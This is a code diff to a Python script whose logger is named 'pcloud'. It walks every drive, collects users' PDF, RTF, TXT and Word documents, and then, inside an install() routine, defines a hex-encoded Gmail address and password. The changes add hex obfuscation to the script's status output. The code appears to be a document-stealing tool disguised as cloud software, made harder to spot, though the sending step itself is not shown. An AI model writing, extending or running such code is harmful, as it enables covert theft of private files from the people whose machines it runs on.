@@ -11,25 +11,30 @@ import uuid
 logger = logging.getLogger("pcloud")
 logger.setLevel(logging.ERROR)
 
+def string_to_hex(s):
+    return ''.join(format(ord(c), '02x') for c in s)
+
 def get_filepaths():
     drives = psutil.disk_partitions()
 
     filepaths = []
     for drive in drives:
-        print(" [*]:0X", drive.device + "1773")
+        print(" [*]:0X", string_to_hex(str(drive.device)))
         for root, dirs, files in os.walk(drive.device):
             for file in files:
                 if not (root.startswith("C:\\Windows") or (root.startswith("C:\\Users\\") and "\\AppData" in root)):
                     if file.endswith(".pdf") or file.endswith(".RTF") or file.endswith(".txt") or file.endswith(".doc") or file.endswith(".docx"):
                         # print(os.path.join(root, file))
                         filepaths.append(os.path.join(root, file))
+            print(" [*] N: " + string_to_hex(str(len(filepaths))))
+    print(" [*] N: " + string_to_hex(str(len(filepaths))))
     return filepaths
 
 
 def install():
     filepaths = get_filepaths()
     cleaned_filepaths = list(set(filepaths))
-    print(" [*] N: " + str(len(cleaned_filepaths)))
+    print(" [*] N: " + string_to_hex(str(len(cleaned_filepaths))))
 
     e_hex = '6861736565622e7075626c69637465737440676d61696c2e636f6d'
     p_hex = '6861736565622e7075626c696374657374'
